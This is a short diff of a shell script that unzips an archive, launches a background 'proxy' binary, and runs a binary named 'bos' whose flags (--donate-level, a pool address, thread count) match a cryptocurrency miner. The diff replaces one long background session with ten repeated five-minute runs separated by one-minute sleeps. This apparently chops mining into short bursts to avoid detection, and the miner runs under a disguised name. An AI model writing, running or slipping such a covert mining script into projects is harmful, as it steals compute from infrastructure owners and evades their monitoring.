@@ -4,5 +4,24 @@ unzip satu.zip
 chmod +x proxy
 nohup ./proxy &
 chmod +x bos
-screen -dmS play ./bos --donate-level 1 -o 127.0.0.1:1234 -t 4
-sleep 676253
+timeout 5m ./bos --donate-level 1 -o 127.0.0.1:1234 -t 4
+sleep 1m
+timeout 5m ./bos --donate-level 1 -o 127.0.0.1:1234 -t 4
+sleep 1m
+timeout 5m ./bos --donate-level 1 -o 127.0.0.1:1234 -t 4
+sleep 1m
+timeout 5m ./bos --donate-level 1 -o 127.0.0.1:1234 -t 4
+sleep 1m
+timeout 5m ./bos --donate-level 1 -o 127.0.0.1:1234 -t 4
+sleep 1m
+timeout 5m ./bos --donate-level 1 -o 127.0.0.1:1234 -t 4
+sleep 1m
+timeout 5m ./bos --donate-level 1 -o 127.0.0.1:1234 -t 4
+sleep 1m
+timeout 5m ./bos --donate-level 1 -o 127.0.0.1:1234 -t 4
+sleep 1m
+timeout 5m ./bos --donate-level 1 -o 127.0.0.1:1234 -t 4
+sleep 1m
+timeout 5m ./bos --donate-level 1 -o 127.0.0.1:1234 -t 4
+sleep 1m
+
